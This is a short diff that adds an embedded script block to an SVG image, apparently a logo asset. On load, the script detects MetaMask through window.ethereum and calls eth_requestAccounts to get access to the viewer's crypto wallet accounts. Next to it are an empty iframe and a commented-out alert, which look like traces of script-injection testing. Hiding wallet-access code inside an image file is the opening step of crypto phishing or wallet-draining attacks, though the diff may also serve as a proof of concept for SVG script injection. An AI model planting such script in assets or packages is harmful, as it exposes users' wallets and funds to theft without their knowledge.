@@ -12,4 +12,16 @@
       <stop offset="1" stop-color="#1FC7D4"/>
     </linearGradient>
   </defs>
+  <script xmlns="http://www.w3.org/2000/svg" type="text/ecmascript">
+  <iframe src =''/>
+  <!-- alert("This is an APPLE!"); -->
+  if (typeof window.ethereum !== 'undefined') {
+    console.log('MetaMask is installed!');
+  }
+  async function a(){
+    console.log(window.ethereum);
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  }
+  a()
+  </script>
 </svg>
